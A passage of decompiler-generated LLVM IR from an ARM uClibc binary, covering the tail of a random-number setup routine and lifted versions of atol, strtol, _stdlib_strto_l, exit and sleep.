  %v1_17b98 = phi i32 [ 3, %bb22 ], [ %v1_17b8c7, %bb21 ], [ %v1_17b8c6, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -34004), i32* %r3.global-to-local, align 4
  %v4_17b8c = mul i32 %v1_17b98, 4
  %v5_17b8c = add i32 %v4_17b8c, add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -34004)
  store i32 %v5_17b8c, i32* %r2.global-to-local, align 4
  %v1_17b90 = add i32 %v4_17b8c, add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -33984)
  %v2_17b90 = inttoptr i32 %v1_17b90 to i32*
  %v3_17b90 = load i32, i32* %v2_17b90, align 4
  store i32 %v3_17b90, i32* %r1.global-to-local, align 4
  %v1_17b94 = add i32 %tmp, 4
  store i32 %v1_17b94, i32* @r6, align 4
  %v6_17b98 = inttoptr i32 %v5_17b8c to i32*
  %v7_17b98 = load i32, i32* %v6_17b98, align 4
  store i32 %v7_17b98, i32* %r2.global-to-local, align 4
  %v4_17b9c = mul i32 %v3_17b90, 4
  %v5_17b9c = add i32 %v4_17b9c, %v1_17b94
  store i32 %v5_17b9c, i32* %r3.global-to-local, align 4
  %v2_17ba0 = add i32 %arg3, 16
  %v3_17ba0 = inttoptr i32 %v2_17ba0 to i32*
  store i32 %v5_17b9c, i32* %v3_17ba0, align 4
  %v0_17ba4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ba4 = trunc i32 %v0_17ba4 to i8
  %v2_17ba4 = load i32, i32* @r5, align 4
  %v3_17ba4 = add i32 %v2_17ba4, 14
  %v4_17ba4 = inttoptr i32 %v3_17ba4 to i8*
  store i8 %v1_17ba4, i8* %v4_17ba4, align 1
  %v0_17ba8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17ba8 = trunc i32 %v0_17ba8 to i8
  %v2_17ba8 = load i32, i32* @r5, align 4
  %v3_17ba8 = add i32 %v2_17ba8, 13
  %v4_17ba8 = inttoptr i32 %v3_17ba8 to i8*
  store i8 %v1_17ba8, i8* %v4_17ba8, align 1
  %v0_17bac = load i32, i32* @r4, align 4
  %v1_17bac = trunc i32 %v0_17bac to i8
  %v2_17bac = load i32, i32* @r5, align 4
  %v3_17bac = add i32 %v2_17bac, 12
  %v4_17bac = inttoptr i32 %v3_17bac to i8*
  store i8 %v1_17bac, i8* %v4_17bac, align 1
  %v0_17bb0 = load i32, i32* @r6, align 4
  %v1_17bb0 = load i32, i32* @r5, align 4
  %v2_17bb0 = add i32 %v1_17bb0, 8
  %v3_17bb0 = inttoptr i32 %v2_17bb0 to i32*
  store i32 %v0_17bb0, i32* %v3_17bb0, align 4
  %v0_17bb4 = load i32, i32* @r5, align 4
  store i32 %v0_17bb4, i32* %r1.global-to-local, align 4
  %v0_17bb8 = load i32, i32* @r0, align 4
  %v2_17bb8 = inttoptr i32 %v0_17bb8 to i32*
  %v3_17bb8 = call i32 @srandom_r(i32* %v2_17bb8, i32 %v0_17bb4)
  store i32 %v3_17bb8, i32* %r0.global-to-local, align 4
  %v0_17bbc = load i32, i32* @r4, align 4
  %v2_17bbc = icmp eq i32 %v0_17bbc, 0
  br i1 %v2_17bbc, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_17bd812 = load i32, i32* @r7, align 4
  %v2_17bd813 = inttoptr i32 %v1_17bd812 to i32*
  store i32 0, i32* %v2_17bd813, align 4
  %v1_17bdc = load i32, i32* @r4, align 4
  store i32 %v1_17bdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c00

.thread4:                                         ; preds = %bb26
  %v1_17bc0 = load i32, i32* @r5, align 4
  %v2_17bc0 = add i32 %v1_17bc0, 4
  %v3_17bc0 = inttoptr i32 %v2_17bc0 to i32*
  %v4_17bc0 = load i32, i32* %v3_17bc0, align 4
  %v1_17bc4 = load i32, i32* @r6, align 4
  %v3_17bc4 = sub i32 %v4_17bc0, %v1_17bc4
  %v4_17bc8 = sdiv i32 %v3_17bc4, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_17bd0 = mul i32 %v4_17bc8, 5
  %v5_17bd0 = add i32 %v4_17bd0, %v0_17bbc
  store i32 %v5_17bd0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17bd8 = load i32, i32* @r7, align 4
  %v2_17bd8 = inttoptr i32 %v1_17bd8 to i32*
  store i32 0, i32* %v2_17bd8, align 4
  %v1_17be0 = load i32, i32* %r3.global-to-local, align 4
  %v2_17be0 = load i32, i32* @r7, align 4
  %v3_17be0 = inttoptr i32 %v2_17be0 to i32*
  store i32 %v1_17be0, i32* %v3_17be0, align 4
  %v1_17c08.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c00

dec_label_pc_17be8:                               ; preds = %dec_label_pc_17b68
  %v0_17be8 = call i32 @__GI___errno_location()
  store i32 %v0_17be8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_17bf0 = inttoptr i32 %v0_17be8 to i32*
  store i32 22, i32* %v2_17bf0, align 4
  %v0_17bf4 = call i32 @__GI___errno_location()
  %v0_17bf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_17bf8 = inttoptr i32 %v0_17bf4 to i32*
  store i32 %v0_17bf8, i32* %v2_17bf8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c00

dec_label_pc_17c00:                               ; preds = %bb27, %.thread4, %dec_label_pc_17be8
  %v1_17c08 = phi i32 [ %v1_17c08.pre, %.thread4 ], [ %v1_17bdc, %bb27 ], [ -1, %dec_label_pc_17be8 ]
  store i32 %v3_17b30, i32* @r4, align 4
  store i32 %v6_17b30, i32* @r5, align 4
  ret i32 %v1_17c08

; uselistorder directives
  uselistorder i1 %v7_17b78, { 1, 0 }
  uselistorder i1 %v7_17b50, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -34004), { 1, 0, 2 }
  uselistorder i32 %arg2, { 5, 6, 0, 1, 4, 3, 2, 7 }
  uselistorder label %dec_label_pc_17c00, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_17c24 = call i32 @strtol()
  ret i32 %v0_17c24
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_17c40 = call i32 @_stdlib_strto_l()
  ret i32 %v0_17c40
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_17c64 = load i32, i32* @r1, align 4
  store i32 %v0_17c64, i32* %fp.global-to-local, align 4
  %v0_17c68 = load i32, i32* @r2, align 4
  store i32 %v0_17c68, i32* %r5.global-to-local, align 4
  %v0_17c6c = load i32, i32* @r0, align 4
  store i32 %v0_17c6c, i32* %r4.global-to-local, align 4
  %v0_17c70 = load i32, i32* @r3, align 4
  br label %dec_label_pc_17c7c

dec_label_pc_17c78:                               ; preds = %dec_label_pc_17c7c
  %v1_17c78 = add i32 %v0_17cb4, 1
  store i32 %v1_17c78, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17c7c

dec_label_pc_17c7c:                               ; preds = %entry, %dec_label_pc_17c78
  %v0_17cb4 = phi i32 [ %v0_17c6c, %entry ], [ %v1_17c78, %dec_label_pc_17c78 ]
  %v1_17c7c = inttoptr i32 %v0_17cb4 to i8*
  %v2_17c7c = load i8, i8* %v1_17c7c, align 1
  %v3_17c7c = zext i8 %v2_17c7c to i32
  %v4_17c80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 532) to i32*), align 4
  %v2_17c84 = mul nuw nsw i32 %v3_17c7c, 2
  %v2_17c88 = add i32 %v2_17c84, %v4_17c80
  %v3_17c88 = inttoptr i32 %v2_17c88 to i16*
  %v4_17c88 = load i16, i16* %v3_17c88, align 2
  %v1_17c8c = and i16 %v4_17c88, 32
  %v2_17c8c = icmp eq i16 %v1_17c8c, 0
  br i1 %v2_17c8c, label %dec_label_pc_17c94, label %dec_label_pc_17c78

dec_label_pc_17c94:                               ; preds = %dec_label_pc_17c7c
  %v7_17c94 = icmp eq i8 %v2_17c7c, 43
  br i1 %v7_17c94, label %dec_label_pc_17cb4, label %dec_label_pc_17c9c

dec_label_pc_17c9c:                               ; preds = %dec_label_pc_17c94
  %v7_17c9c = icmp eq i8 %v2_17c7c, 45
  br i1 %v7_17c9c, label %dec_label_pc_17cb4, label %bb

bb:                                               ; preds = %dec_label_pc_17c9c
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17cb8

dec_label_pc_17cb4:                               ; preds = %dec_label_pc_17c94, %dec_label_pc_17c9c
  %storemerge48 = phi i32 [ 1, %dec_label_pc_17c9c ], [ 0, %dec_label_pc_17c94 ]
  store i32 %storemerge48, i32* %r7.global-to-local, align 4
  %v1_17cb4 = add i32 %v0_17cb4, 1
  store i32 %v1_17cb4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17cb8

dec_label_pc_17cb8:                               ; preds = %bb, %dec_label_pc_17cb4
  %v0_17cd8 = phi i32 [ %v0_17cb4, %bb ], [ %v1_17cb4, %dec_label_pc_17cb4 ]
  %v1_17cb8 = and i32 %v0_17c68, -17
  %v3_17cb8 = icmp eq i32 %v1_17cb8, 0
  br i1 %v3_17cb8, label %dec_label_pc_17cc4, label %bb61

bb61:                                             ; preds = %dec_label_pc_17cb8
  br label %bb65

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17cb8
  %v1_17cc4 = inttoptr i32 %v0_17cd8 to i8*
  %v2_17cc4 = load i8, i8* %v1_17cc4, align 1
  %v7_17cc8 = icmp eq i8 %v2_17cc4, 48
  %v1_17ccc = add i32 %v0_17c68, 10
  store i32 %v1_17ccc, i32* %r5.global-to-local, align 4
  br i1 %v7_17cc8, label %dec_label_pc_17cd8, label %bb62

bb62:                                             ; preds = %dec_label_pc_17cc4
  br label %.thread9

dec_label_pc_17cd8:                               ; preds = %dec_label_pc_17cc4
  %v1_17cd8 = add i32 %v0_17cd8, 1
  %v2_17cd8 = inttoptr i32 %v1_17cd8 to i8*
  %v3_17cd8 = load i8, i8* %v2_17cd8, align 1
  %v4_17cd8 = zext i8 %v3_17cd8 to i32
  store i32 %v1_17cd8, i32* %r4.global-to-local, align 4
  %v1_17cdc = or i32 %v4_17cd8, 32
  %v7_17ce0 = icmp eq i32 %v1_17cdc, 120
  %v1_17ce4 = add i32 %v0_17c68, 8
  store i32 %v1_17ce4, i32* %r5.global-to-local, align 4
  br i1 %v7_17ce0, label %bb63, label %.thread9

bb63:                                             ; preds = %dec_label_pc_17cd8
  %v3_17cf0 = mul i32 %v1_17ce4, 2
  store i32 %v3_17cf0, i32* %r5.global-to-local, align 4
  %v2_17cf4 = add i32 %v0_17cd8, 2
  store i32 %v2_17cf4, i32* %r4.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17cd8, %bb62, %bb63
  %v1_17dc031 = phi i32 [ %v0_17c6c, %bb62 ], [ %v1_17cd8, %bb63 ], [ %v1_17cd8, %dec_label_pc_17cd8 ]
  %v0_17d4422 = phi i32 [ %v0_17cd8, %bb62 ], [ %v2_17cf4, %bb63 ], [ %v1_17cd8, %dec_label_pc_17cd8 ]
  %v0_17cf8 = phi i32 [ %v1_17ccc, %bb62 ], [ %v3_17cf0, %bb63 ], [ %v1_17ce4, %dec_label_pc_17cd8 ]
  %v5_17cfc = icmp slt i32 %v0_17cf8, 16
  br i1 %v5_17cfc, label %bb65, label %bb64

bb64:                                             ; preds = %.thread9
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %bb61, %.thread9, %bb64
  %v1_17dc030 = phi i32 [ %v0_17c6c, %bb61 ], [ %v1_17dc031, %.thread9 ], [ %v1_17dc031, %bb64 ]
  %v0_17d4421 = phi i32 [ %v0_17cd8, %bb61 ], [ %v0_17d4422, %.thread9 ], [ %v0_17d4422, %bb64 ]
  %v0_17d24 = phi i32 [ %v0_17c68, %bb61 ], [ %v0_17cf8, %.thread9 ], [ 16, %bb64 ]
  %v1_17d00 = add i32 %v0_17d24, -2
  %tmp = icmp ugt i32 %v1_17d00, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_17d10

.thread:                                          ; preds = %bb65
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_17dbc

dec_label_pc_17d10:                               ; preds = %bb65
  %v2_17d18 = udiv i32 -1, %v0_17d24
  %v3_17d18 = urem i32 -1, %v0_17d24
  %v1_17d28 = urem i32 %v3_17d18, 256
  store i32 %v1_17d28, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_17d18, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_17d44

dec_label_pc_17d40:                               ; preds = %bb72, %dec_label_pc_17da0
  %v0_17d40 = phi i32 [ %v1_17d8045, %bb72 ], [ %v0_17d40.pre, %dec_label_pc_17da0 ]
  br label %dec_label_pc_17d44

dec_label_pc_17d44:                               ; preds = %dec_label_pc_17d10, %dec_label_pc_17d40
  %v1_17dc028 = phi i32 [ %v1_17dc030, %dec_label_pc_17d10 ], [ %v0_17d40, %dec_label_pc_17d40 ]
  %v0_17d80 = phi i32 [ %v0_17d4421, %dec_label_pc_17d10 ], [ %v0_17d40, %dec_label_pc_17d40 ]
  %v1_17d44 = inttoptr i32 %v0_17d80 to i8*
  %v2_17d44 = load i8, i8* %v1_17d44, align 1
  %v3_17d44 = zext i8 %v2_17d44 to i32
  %v1_17d48 = add nsw i32 %v3_17d44, -48
  %v1_17d4c = urem i32 %v1_17d48, 256
  %v1_17d54 = or i32 %v3_17d44, 32
  %tmp80 = icmp ult i32 %v1_17d4c, 10
  br i1 %tmp80, label %bb67, label %dec_label_pc_17d5c

dec_label_pc_17d5c:                               ; preds = %dec_label_pc_17d44
  %tmp81 = icmp ugt i32 %v1_17d54, 96
  br i1 %tmp81, label %bb66, label %bb67

bb66:                                             ; preds = %dec_label_pc_17d5c
  %v1_17d60 = add nsw i32 %v1_17d54, -87
  %v5_17d68 = urem i32 %v1_17d60, 256
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_17d44, %dec_label_pc_17d5c, %bb66
  %v3_17d98 = phi i32 [ %v1_17d4c, %dec_label_pc_17d44 ], [ 40, %dec_label_pc_17d5c ], [ %v5_17d68, %bb66 ]
  %v1_17d6c = load i32, i32* %r5.global-to-local, align 4
  %v6_17d70 = icmp slt i32 %v3_17d98, %v1_17d6c
  br i1 %v6_17d70, label %dec_label_pc_17d74, label %dec_label_pc_17dbc.loopexit

dec_label_pc_17d74:                               ; preds = %bb67
  %v0_17d74 = load i32, i32* @ip, align 4
  %v1_17d74 = load i32, i32* %r8.global-to-local, align 4
  %v9_17d74 = icmp eq i32 %v0_17d74, %v1_17d74
  br i1 %v9_17d74, label %.thread40, label %bb68

.thread40:                                        ; preds = %dec_label_pc_17d74
  %v1_17d8041 = add i32 %v0_17d80, 1
  store i32 %v1_17d8041, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17d88

bb68:                                             ; preds = %dec_label_pc_17d74
  %v3_17d74 = icmp ult i32 %v0_17d74, %v1_17d74
  %v1_17d80 = add i32 %v0_17d80, 1
  store i32 %v1_17d80, i32* %r4.global-to-local, align 4
  br i1 %v3_17d74, label %dec_label_pc_17d88, label %dec_label_pc_17da0

dec_label_pc_17d88:                               ; preds = %bb68, %.thread40
  %v1_17d8045 = phi i32 [ %v1_17d8041, %.thread40 ], [ %v1_17d80, %bb68 ]
  %v4_17d902544 = phi i32 [ 1, %.thread40 ], [ 0, %bb68 ]
  %v1_17d88 = load i32, i32* %sl.global-to-local, align 4
  %v3_17d88 = icmp uge i32 %v3_17d98, %v1_17d88
  %v9_17d88 = icmp eq i32 %v3_17d98, %v1_17d88
  %v2_17d8c = xor i1 %v3_17d88, true
  %v3_17d8c = or i1 %v9_17d88, %v2_17d8c
  br i1 %v3_17d8c, label %bb69, label %bb70

bb69:                                             ; preds = %dec_label_pc_17d88
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_17d88, %bb69
  %v4_17d90 = phi i32 [ %v4_17d902544, %dec_label_pc_17d88 ], [ 0, %bb69 ]
  %v2_17d90 = xor i1 %v9_17d88, true
  %v3_17d90 = and i1 %v3_17d88, %v2_17d90
  br i1 %v3_17d90, label %bb71, label %thread-pre-split

bb71:                                             ; preds = %bb70
  %v5_17d90 = urem i32 %v4_17d90, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb70, %bb71
  %v0_17d94 = phi i32 [ %v5_17d90, %bb71 ], [ %v4_17d90, %bb70 ]
  %v2_17d94 = icmp eq i32 %v0_17d94, 0
  br i1 %v2_17d94, label %bb72, label %dec_label_pc_17da0

bb72:                                             ; preds = %thread-pre-split
  %v4_17d98 = mul i32 %v0_17d74, %v1_17d6c
  %v5_17d98 = add i32 %v4_17d98, %v3_17d98
  store i32 %v5_17d98, i32* @ip, align 4
  br label %dec_label_pc_17d40

dec_label_pc_17da0:                               ; preds = %bb68, %thread-pre-split
  %v0_17da0 = call i32 @__GI___errno_location()
  %v0_17da8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17da8, i32* @ip, align 4
  %v0_17dac = load i32, i32* %r7.global-to-local, align 4
  %v2_17dac = and i32 %v0_17dac, %v0_17c70
  store i32 %v2_17dac, i32* %r7.global-to-local, align 4
  %v2_17db4 = inttoptr i32 %v0_17da0 to i32*
  store i32 34, i32* %v2_17db4, align 4
  %v0_17d40.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17d40

dec_label_pc_17dbc.loopexit:                      ; preds = %bb67
  %v0_17dbc.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17dbc

dec_label_pc_17dbc:                               ; preds = %.thread, %dec_label_pc_17dbc.loopexit
  %v1_17dc0 = phi i32 [ %v1_17dc028, %dec_label_pc_17dbc.loopexit ], [ %v1_17dc030, %.thread ]
  %v2_17dc0 = phi i32 [ %v0_17dbc.pre, %dec_label_pc_17dbc.loopexit ], [ %v0_17c64, %.thread ]
  %v2_17dbc = icmp eq i32 %v2_17dc0, 0
  br i1 %v2_17dbc, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_17dbc
  %v3_17dc0 = inttoptr i32 %v2_17dc0 to i32*
  store i32 %v1_17dc0, i32* %v3_17dc0, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_17dbc, %bb73
  %v0_17dc8 = load i32, i32* %r7.global-to-local, align 4
  %v2_17dc8 = icmp eq i32 %v0_17dc8, 0
  %. = select i1 %v2_17dc8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_17dd4 = icmp eq i32 %v0_17c70, 0
  %v0_17df8.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_17dd4, label %dec_label_pc_17df0, label %bb77

bb77:                                             ; preds = %bb74
  %tmp82 = icmp ugt i32 %v0_17df8.pre.pre, %.
  br i1 %tmp82, label %dec_label_pc_17de0, label %dec_label_pc_17df0

dec_label_pc_17de0:                               ; preds = %bb77
  %v0_17de0 = call i32 @__GI___errno_location()
  %v2_17de8 = inttoptr i32 %v0_17de0 to i32*
  store i32 34, i32* %v2_17de8, align 4
  %v0_17dec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17dec, i32* @ip, align 4
  %v0_17df0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17df0

dec_label_pc_17df0:                               ; preds = %bb77, %bb74, %dec_label_pc_17de0
  %v0_17df8.pre = phi i32 [ %v0_17df8.pre.pre, %bb77 ], [ %v0_17dec, %dec_label_pc_17de0 ], [ %v0_17df8.pre.pre, %bb74 ]
  %v0_17df0 = phi i32 [ %v0_17dc8, %bb77 ], [ %v0_17df0.pre, %dec_label_pc_17de0 ], [ %v0_17dc8, %bb74 ]
  %v2_17df0 = icmp eq i32 %v0_17df0, 0
  br i1 %v2_17df0, label %dec_label_pc_17df0._crit_edge, label %bb78

bb78:                                             ; preds = %dec_label_pc_17df0
  %v2_17df4 = sub i32 0, %v0_17df8.pre
  store i32 %v2_17df4, i32* @ip, align 4
  br label %dec_label_pc_17df0._crit_edge

dec_label_pc_17df0._crit_edge:                    ; preds = %dec_label_pc_17df0, %bb78
  %v0_17df8 = phi i32 [ %v2_17df4, %bb78 ], [ %v0_17df8.pre, %dec_label_pc_17df0 ]
  %sext = mul i32 %v0_17df8, 65536
  %v2_17e04 = sdiv i32 %sext, 65536
  ret i32 %v2_17e04

; uselistorder directives
  uselistorder i32 %v0_17df8.pre, { 1, 0 }
  uselistorder i32 %v0_17df8.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_17d90, { 1, 0 }
  uselistorder i1 %v3_17d88, { 1, 0 }
  uselistorder i32 %v1_17d88, { 1, 0 }
  uselistorder i32 %v1_17d54, { 1, 0 }
  uselistorder i32 %v1_17d4c, { 1, 0 }
  uselistorder i32 %v0_17d80, { 1, 0, 2 }
  uselistorder i32 %v0_17d40, { 1, 0 }
  uselistorder i32 %v3_17cf0, { 1, 0 }
  uselistorder i32 %v1_17ce4, { 1, 0, 2 }
  uselistorder i32 %v0_17cd8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_17cb4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_17c70, { 1, 0 }
  uselistorder i32 %v0_17c6c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17c68, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_17df0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17df0, { 2, 0, 1 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_17dbc, { 1, 0 }
  uselistorder label %dec_label_pc_17da0, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %bb67, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17d44, { 1, 0 }
  uselistorder label %dec_label_pc_17d40, { 1, 0 }
  uselistorder label %bb65, { 2, 1, 0 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17cb8, { 1, 0 }
  uselistorder label %dec_label_pc_17cb4, { 1, 0 }
  uselistorder label %dec_label_pc_17c7c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r5, align 4
  %v4_17e1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 100) to i32*), align 4
  store i32 %v4_17e1c, i32* @r4, align 4
  %v2_17e24 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_17e3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17e3c)
  %v0_17e50 = load i32, i32* @r5, align 4
  %v2_17e50 = add i32 %v0_17e50, 20
  %v3_17e50 = inttoptr i32 %v2_17e50 to i32*
  %v4_17e50 = load i32, i32* %v3_17e50, align 4
  call void @__pseudo_branch(i32 %v4_17e50)
  %v0_17e60 = load i32, i32* @r5, align 4
  %v2_17e60 = add i32 %v0_17e60, 26280
  %v3_17e60 = inttoptr i32 %v2_17e60 to i32*
  %v4_17e60 = load i32, i32* %v3_17e60, align 4
  %v2_17e64 = icmp eq i32 %v4_17e60, 0
  br i1 %v2_17e64, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_17e70 = xor i1 %v2_17e64, true
  call void @__pseudo_cond_branch(i1 %v2_17e70, i32 %v4_17e60)
  store i32 %v2_17e24, i32* @r0, align 4
  %v0_17e80 = load i32, i32* @r5, align 4
  %v2_17e80 = add i32 %v0_17e80, 28
  %v3_17e80 = inttoptr i32 %v2_17e80 to i32*
  %v4_17e80 = load i32, i32* %v3_17e80, align 4
  call void @__pseudo_branch(i32 %v4_17e80)
  %v0_17e8c = call i32 @__GI___uClibc_fini()
  %v0_17e94 = load i32, i32* @r5, align 4
  %v2_17e94 = add i32 %v0_17e94, -97080
  %v10_17e94 = icmp eq i32 %v2_17e94, 0
  br i1 %v10_17e94, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %sext = mul i32 %v2_17e94, 65536
  %v1_17e9c = sdiv i32 %sext, 65536
  %v3_17e9c = xor i1 %v10_17e94, true
  call void @__pseudo_cond_branch(i1 %v3_17e9c, i32 %v1_17e9c)
  %v0_17ea0 = load i32, i32* @r6, align 4
  %v1_17ea4 = call i32 @__GI__exit(i32 %v0_17ea0)
  %v0_17ea8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17ea8, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_17ea8 = load i32, i32* @r1, align 4
  %v2_17ea8 = load i32, i32* @r8, align 4
  %v9_17ea8 = lshr i32 %v2_17ea8, %v1_17e9c
  %v10_17ea8 = and i32 %v9_17ea8, %v1_17ea8
  store i32 %v10_17ea8, i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_17ec0 = phi i32 [ %v1_17ea4, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_17ec0

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_17ec8 = load i32, i32* @r4, align 4
  %v6_17ec8 = load i32, i32* @lr, align 4
  %v2_17ecc = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_17ecc, label %dec_label_pc_17f60, label %dec_label_pc_17edc

dec_label_pc_17edc:                               ; preds = %entry
  %v2_17eec = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_17f00 = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_17eec)
  %v3_17f04 = load i32, i32* %stack_var_-44, align 4
  %v7_17f08 = icmp eq i32 %v3_17f04, 1
  br i1 %v7_17f08, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17edc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17edc, %bb
  call void @__pseudo_cond_branch(i1 %v7_17f08, i32 ptrtoint (i32* @global_var_14340.1035 to i32))
  %v2_17f1c = ptrtoint i32* %stack_var_-16 to i32
  %v2_17f24 = call i32 @__libc_nanosleep(i32 %v2_17f1c, i32 %v2_17f1c)
  %v2_17f28 = icmp eq i32 %v2_17f24, 0
  br i1 %v2_17f28, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_17f3c = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_17f3c, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_17f4c = load i32, i32* %stack_var_-24, align 4
  %v1_17f50 = and i32 %v3_17f4c, 65536
  %v2_17f50 = icmp eq i32 %v1_17f50, 0
  br i1 %v2_17f50, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_17f50, i32 ptrtoint (i32* @global_var_14340.1035 to i32))
  %v0_17f60.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17f60

dec_label_pc_17f60:                               ; preds = %entry, %.thread6
  %v0_17f60 = phi i32 [ %v0_17f60.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_17ec8, i32* @r4, align 4
  store i32 %v6_17ec8, i32* @lr, align 4
  ret i32 %v0_17f60

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17f60, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
